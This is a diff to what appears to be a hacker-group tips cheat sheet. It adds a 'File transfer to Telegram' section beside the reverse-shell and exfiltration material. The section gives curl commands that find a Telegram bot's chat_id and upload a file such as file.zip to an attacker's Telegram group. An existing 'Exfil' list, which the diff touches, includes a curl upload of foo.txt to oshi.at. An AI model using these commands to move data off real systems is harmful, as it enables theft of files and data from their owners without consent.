@@ -39,6 +39,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using HTTP](#http)
    1. [File transfer without curl](#burl)
    1. [File transfer using WebDAV](#webdav)
+   1. [File transfer to Telegram](#tg) 
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
    1. [Reverse Shells](#reverse-shell)
       1. [with gs-netcat](#reverse-shell-gs-netcat)
@@ -898,6 +899,18 @@ Or mount the WebDAV share on Windows (Z:/):
 net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
+<a id="tg"></a>
+### 4.vi. File transfer to Telegram
+
+There are [zillions of upload services](#exfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
+```
+curl -s "https://api.telegram.org/bot<TG-BOT-TOKEN>/getUpdates" | jq -r '.result[].message.chat.id' | uniq
+```
+
+```sh
+curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocument?chat_id=<TG-CHAT-ID>"
+```
+
 ---
 <a id="reverse-shell"></a>
 ## 5. Reverse Shell / Dumb Shell
@@ -1549,7 +1562,7 @@ Tunneling
 1. [TCP Gender Changer](https://tgcd.sourceforge.net/) for all your 'connect back' needs.
 1. [ngrok](https://ngrok.com/download), [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps) or [pagekite](https://pagekite.net/) to make a server behind NAT accessible from the public Internet.
 
-Exfil
+Exfil<a id="exfil"></a>
 1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
 1. [Mega](https://mega.io/cmd)
 2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
